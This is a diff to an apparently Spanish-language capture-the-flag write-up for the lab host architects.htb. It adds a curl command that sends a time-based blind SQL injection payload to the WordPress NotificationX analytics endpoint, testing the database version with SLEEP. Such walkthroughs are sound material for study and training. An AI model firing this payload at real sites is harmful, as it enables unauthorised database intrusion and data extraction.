@@ -185,3 +185,8 @@ Esta vulnerabilidad permite realizar una sql-injection que se puede usar para ex
 time curl http://localhost/wp-json/notificationx/v1/analytics -d 'nx_id=1337&type=clicks`=IF(SUBSTRING(version(),1,1)=5,SLEEP(10),null)-- -'
 ```
 
+Para testear si el sitio web http://architects.htb es vulnerable replicaremos lo que nos indica el sitio web.
+
+```python
+❯ time curl http://architects.htb/wp-json/notificationx/v1/analytics -d 'nx_id=1337&type=clicks`=IF(SUBSTRING(version(),1,1)=5,SLEEP(10),null)-- -'
+```
